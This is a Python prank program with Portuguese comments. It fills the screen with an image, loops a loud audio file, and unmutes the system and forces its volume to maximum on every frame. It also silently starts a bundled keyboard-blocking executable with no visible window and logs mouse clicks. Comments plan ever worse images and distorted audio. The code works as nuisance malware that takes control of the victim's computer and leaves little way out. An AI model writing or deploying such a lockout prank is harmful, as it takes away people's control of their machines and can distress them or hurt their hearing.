import os
import pygame
import sys
import time
import subprocess
from pynput import keyboard ,mouse
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import cast, POINTER

def aumentar_volume():
    try: 
        # Obter o dispositivo de saída de áudio
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))

        # Verificar se o volume está silenciado
        if volume.GetMute():
            # Desativar o modo mudo
            volume.SetMute(False, None)

        # Aumentar o volume para 100%
        volume.SetMasterVolumeLevelScalar(1.0, None)
    except Exception as e:
        print(f'Erro ao aumentar o volume: {e}')

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

# Inicializa o Pygame
pygame.init()

# Configurações da tela
screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)  # Tela cheia
pygame.display.set_caption("Imagem com Áudio")

# Carregar a imagem
image_file = resource_path('Code/Static/dog_mama.jpeg') # Trocar as imagens para cada vez pior
image = pygame.image.load(image_file)

# Carregar o áudio
audio_file = resource_path('Code/Static/aud_troll.mp3')  # Encontrar vários áudios estourados e zuados
pygame.mixer.music.load(audio_file)
pygame.mixer.music.play(-1)  # Toca o áudio em loop

# Executar o script C e utilizar flags para deixá-lo em 2º plano
exe_path = resource_path('Code/block_teclado.exe') # Adicionei essa linha, qualquer coisa remover
subprocess.Popen(exe_path, creationflags=subprocess.CREATE_NO_WINDOW)

def on_click(x, y, button, pressed):
    if pressed:
        print(f'Mouse clicked at ({x}, {y}) with {button}')

# Configura o listener
mouse_listener = mouse.Listener(on_click=on_click)

mouse_listener.start()

# Loop principal
while True:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            mouse_listener.stop()
            pygame.quit()
            sys.exit()

    # Aumentar o volume
    aumentar_volume()

    # Preenche a tela com a imagem
    screen.blit(image, (0, 0))
    pygame.display.flip()